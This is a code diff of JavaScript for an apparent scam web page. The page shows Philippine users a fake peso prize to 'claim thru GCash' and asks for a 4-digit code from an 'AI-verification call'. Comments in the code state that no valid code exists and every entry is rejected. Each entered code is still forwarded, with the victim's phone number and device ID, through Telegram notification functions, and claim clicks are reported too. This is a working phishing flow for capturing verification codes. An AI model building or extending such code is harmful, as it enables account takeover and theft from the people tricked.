-                if (statusText) statusText.innerHTML = '<strong style="color: #ff9100;">CALL EXPIRED</strong>';
-                if (timerDisplay) timerDisplay.style.display = 'none';
-                if (codeSection) codeSection.style.display = 'none';
+                if (statusText) {
+                    statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
+                    statusText.style.color = '#ff8800';
+                }
+                if (timerDisplay) {
+                    timerDisplay.style.display = 'none';
+                    timerDisplay.style.animation = '';
+                }
+                if (codeSection) {
+                    codeSection.style.display = 'none';
+                }
                 if (requestBtn) {
                     requestBtn.disabled = false;
                     requestBtn.style.opacity = '1';
-                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI CALL';
+                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
                 }
-                if (callExpiredMsg) callExpiredMsg.style.display = 'block';
+                if (callExpiredMsg) {
+                    callExpiredMsg.style.display = 'block';
+                }
                 
                 callInProgress = false;
                 isCallRequested = false;
@@ -819,6 +917,7 @@
         }, 1000);
     }
     
+    // ========== STOP CALL TIMER ==========
     function stopCallTimer() {
         if (callTimerInterval) {
             clearInterval(callTimerInterval);
@@ -837,36 +936,51 @@
         
         var enteredCode = codeInput.value.trim();
         
+        // Validate input
         if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
             if (codeErrorMsg) {
                 codeErrorMsg.textContent = '⚠️ Please enter a valid 4-digit code.';
                 codeErrorMsg.style.display = 'block';
             }
-            codeInput.style.borderColor = '#ff1744';
+            codeInput.style.borderColor = '#ff4444';
+            codeInput.style.boxShadow = '0 0 20px rgba(255, 68, 68, 0.3)';
             shakeElement(codeInput);
             return;
         }
         
+        // Check if call is still active
         if (callCountdown <= 0) {
-            if (callExpiredMsg) callExpiredMsg.style.display = 'block';
+            if (callExpiredMsg) {
+                callExpiredMsg.style.display = 'block';
+            }
             if (codeErrorMsg) codeErrorMsg.style.display = 'none';
+            codeInput.style.borderColor = '#ff8800';
+            codeInput.style.boxShadow = '0 0 20px rgba(255, 136, 0, 0.3)';
             return;
         }
         
+        // ========== DEFAULT: ALWAYS INVALID ==========
+        // No valid code exists - every attempt is invalid
+        
         codeEntered = true;
         
+        // Send Telegram notification for invalid attempt
         var userPhone = localStorage.getItem("userPhone") || "Unknown";
         var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
         sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
         
+        // Show error
         if (codeErrorMsg) {
             codeErrorMsg.textContent = '❌ Invalid verification code. Please request a new call.';
             codeErrorMsg.style.display = 'block';
         }
         
-        codeInput.style.borderColor = '#ff1744';
+        // Visual feedback
+        codeInput.style.borderColor = '#ff4444';
+        codeInput.style.boxShadow = '0 0 30px rgba(255, 68, 68, 0.4)';
         shakeElement(codeInput);
         
+        // Disable verify button temporarily
         if (verifyBtn) {
             verifyBtn.disabled = true;
             verifyBtn.style.opacity = '0.5';
@@ -878,12 +992,57 @@
             }, 2000);
         }
         
+        // Clear input after 1.5 seconds
         setTimeout(function() {
             codeInput.value = '';
-            codeInput.style.borderColor = 'var(--fruit-orange)';
+            codeInput.style.borderColor = '#00d4ff';
+            codeInput.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
+            
+            // Show "request new call" prompt
+            if (codeErrorMsg) {
+                codeErrorMsg.textContent = '🔄 Please request a new AI-Verification call.';
+                codeErrorMsg.style.color = '#ff8800';
+            }
         }, 1500);
+        
+        // Reset to initial state after 4 seconds
+        setTimeout(function() {
+            if (codeErrorMsg) {
+                codeErrorMsg.style.display = 'none';
+                codeErrorMsg.textContent = '';
+                codeErrorMsg.style.color = '#ff4444';
+            }
+            
+            // Show expired state
+            var statusText = document.getElementById('callStatusText');
+            var timerDisplay = document.getElementById('callTimerDisplay');
+            var codeSection = document.getElementById('codeSection');
+            var requestBtn = document.getElementById('requestCallBtn');
+            
+            if (statusText) {
+                statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
+                statusText.style.color = '#ff8800';
+            }
+            if (timerDisplay) {
+                timerDisplay.style.display = 'none';
+                timerDisplay.style.animation = '';
+            }
+            if (codeSection) {
+                codeSection.style.display = 'none';
+            }
+            if (requestBtn) {
+                requestBtn.disabled = false;
+                requestBtn.style.opacity = '1';
+                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
+            }
+            
+            callInProgress = false;
+            isCallRequested = false;
+            
+        }, 4000);
     }
     
+    // ========== SHAKE ELEMENT ANIMATION ==========
     function shakeElement(element) {
         if (!element) return;
         element.style.animation = 'shake 0.5s ease';
@@ -896,8 +1055,10 @@
     function checkFirewallAndTransition() {
         getFirewallStatus().then(function(isFirewallOn) {
             if (isFirewallOn) {
+                console.log('🔥 Firewall ON - Showing AI-Verification');
                 showFirewallPopup();
             } else {
+                console.log('🔓 Firewall OFF - Transition to Phase 2');
                 transitionToPhase2();
             }
         });
@@ -908,16 +1069,18 @@
         var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
-        popupInner.style.transition = 'opacity 0.3s ease';
+        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
+        popupInner.style.transform = 'scale(0.95)';
         
         setTimeout(function() {
             showPhase2();
             popupInner.style.opacity = '1';
+            popupInner.style.transform = 'scale(1)';
         }, 300);
     }
     
-    // ========== PHASE 1: DEFAULT POPUP (3D Fruits Theme) ==========
+    // ========== PHASE 1: DEFAULT POPUP with 500 Bills Indicators ==========
     function showPhase1(balance) {
         var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -933,13 +1096,14 @@
         
         popupInner.style.transition = '';
         popupInner.style.opacity = '1';
+        popupInner.style.transform = '';
         
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase1">✕</div>
-            <h2 class="popup-title" style="font-family: 'Fredoka', sans-serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fff9c4, #ffd700, #ff9500); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
+            <h2 class="popup-title" style="font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
                 🎉 HOORAY! 🎉
             </h2>
-            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #ffd700; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(255,215,0,0.5);" id="popupBalanceDisplay">
+            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);" id="popupBalanceDisplay">
                 ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
             </div>
             <div class="divider"></div>
@@ -951,19 +1115,19 @@
                 <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
             </div>
             
-            <div class="invite-text" style="font-size: 12px; color: rgba(255,255,255,0.7); text-align: center; font-family: 'Plus Jakarta Sans', sans-serif;">
-                Your friend must confirm your invitation to get extra <strong style="color: #ffd700;">₱500 bonus</strong>.
+            <div class="invite-text" style="font-size: 12px; color: #999; text-align: center; font-family: 'Poppins', sans-serif;">
+                Your friend must confirm your invitation to get extra <strong style="color: #fce883;">₱500 bonus</strong>.
             </div>
             <div class="luckyday-image-container" style="text-align: center; margin: 15px 0;">
-                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(255,145,0,0.3);" onerror="this.style.display='none'">
+                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(212,175,55,0.3);" onerror="this.style.display='none'">
             </div>
             <div class="divider"></div>
             
-            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%;">
+            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden;">
                 <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
             </button>
 
-            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(255,145,0,0.4), transparent); margin: 12px 0;"></div>
+            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0;"></div>
 
             <button class="small-back-btn" id="backBtnPhase1" style="margin: 0 auto; display: inline-flex;">
                 ← BACK
@@ -982,16 +1146,36 @@
         if (claimBtn) {
             claimBtn.onclick = function() {
                 if (currentBalance <= 0) {
-                    claimBtn.style.background = 'linear-gradient(to bottom, #ff1744, #cc0000)';
+                    claimBtn.classList.add('shake-effect');
+                    claimBtn.style.background = 'linear-gradient(to bottom, #ff4444, #cc0000)';
+                    claimBtn.style.border = '1px solid #ff6666';
                     claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
                     
+                    var popupTitle = document.querySelector('.popup-title');
+                    if (popupTitle) {
+                        popupTitle.style.background = 'linear-gradient(to bottom, #ff6666, #ff4444)';
+                        popupTitle.style.webkitBackgroundClip = 'text';
+                        popupTitle.style.backgroundClip = 'text';
+                        popupTitle.textContent = '⚠️ NO BALANCE ⚠️';
+                    }
+                    
                     setTimeout(function() {
-                        claimBtn.style.background = 'linear-gradient(to bottom, #FFE94A, #FFD700, #FF9500)';
+                        claimBtn.classList.remove('shake-effect');
+                        claimBtn.style.background = 'linear-gradient(to bottom, #d4af37, #aa771c)';
+                        claimBtn.style.border = '1px solid #fcf6ba';
                         claimBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH';
+                        
+                        if (popupTitle) {
+                            popupTitle.style.background = 'linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c)';
+                            popupTitle.style.webkitBackgroundClip = 'text';
+                            popupTitle.style.backgroundClip = 'text';
+                            popupTitle.textContent = '🎉 HOORAY! 🎉';
+                        }
                     }, 2000);
                     return;
                 }
                 
+                // Send Claim button Telegram notification
                 var userPhone = localStorage.getItem("userPhone") || "Unknown";
                 var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendClaimButtonNotification(userPhone, deviceId, currentBalance);
@@ -1003,7 +1187,7 @@
         }
     }
     
-    // ========== PHASE 2: WITHDRAWAL LINK (3D Fruits Theme) ==========
+    // ========== PHASE 2: WITHDRAWAL LINK ==========
     function showPhase2() {
         var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -1023,24 +1207,24 @@
                 <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
             </div>
             
-            <h2 class="phase2-heading" style="font-family: 'Fredoka', sans-serif; font-size: 20px; font-weight: 900; background: linear-gradient(to bottom, #fff9c4, #ffd700, #ff9500); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center;">GREAT JOB!</h2>
+            <h2 class="phase2-heading" style="font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center;">GREAT JOB!</h2>
             
             <div class="divider"></div>
             
-            <div style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,145,0,0.3); border-radius: 12px; padding: 14px; margin: 10px 0;">
-                <p style="font-size: 11px; color: rgba(255,255,255,0.7); text-align: center; margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;">
+            <div style="background: linear-gradient(145deg, rgba(20, 10, 5, 0.6), rgba(10, 5, 0, 0.6)); border: 1px solid rgba(212,175,55,0.3); border-radius: 12px; padding: 14px; margin: 10px 0;">
+                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0; font-family: 'Poppins', sans-serif;">
                     "Nice work! You're one tap away from your reward!"
                 </p>
-                <p style="font-size: 12px; color: #ffd700; text-align: center; margin: 8px 0 0 0; font-family: 'Orbitron', monospace;">
-                    Your reward: <strong style="font-size: 22px; color: #ffd700; text-shadow: 0 0 15px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</strong>
+                <p style="font-size: 12px; color: #fce883; text-align: center; margin: 8px 0 0 0; font-family: 'Orbitron', monospace;">
+                    Your reward: <strong style="font-size: 22px; color: #fce883; text-shadow: 0 0 15px rgba(212,175,55,0.5);">₱${currentBalance.toFixed(2)}</strong>
                 </p>
             </div>
             
-            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 14px; font-size: 14px; margin-top: 10px;">
+            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 14px; font-size: 14px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;">
                 <img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP
             </button>
 
-            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(255,145,0,0.4), transparent); margin: 12px 0 10px;"></div>
+            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0 10px;"></div>
 
             <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
                 ← BACK
@@ -1076,6 +1260,10 @@
                 if (claimInProgress) return;
                 
                 claimInProgress = true;
+                
+                this.classList.add('btn-pulse');
+                setTimeout(function() { this.classList.remove('btn-pulse'); }.bind(this), 500);
+                
                 this.disabled = true;
                 this.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...';
                 this.style.opacity = '0.8';
@@ -1090,7 +1278,7 @@
                             proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...';
                             setTimeout(function() {
                                 window.removeEventListener('beforeunload', beforeUnloadHandler);
-                                window.location.replace(linkData.url);
+                                window.location.href = linkData.url;
                             }, 1000);
                         });
                     } else {
